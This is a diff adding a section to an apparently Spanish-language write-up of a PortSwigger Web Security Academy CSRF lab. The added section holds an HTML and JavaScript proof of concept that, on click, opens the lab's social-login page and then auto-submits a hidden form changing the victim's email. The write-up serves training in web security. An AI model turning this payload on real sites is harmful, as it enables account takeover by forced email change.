@@ -47,3 +47,9 @@ en este caso el history.pushState no lo necesitamos ya que esta vulnerabilidad p
 
 ###### OPCIÓN 2
 puedes usar este código que que esta proporcionado por el laboratorio si no cuentas con burpsuite profecional.
+
+```python
+`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
+	<input type="hidden" name="email" value="pwned@portswigger.net"> 
+</form> <p>Click anywhere on the page</p> <script> window.onclick = () => { window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); } function changeEmail() { document.forms[0].submit(); } </script>`
+```
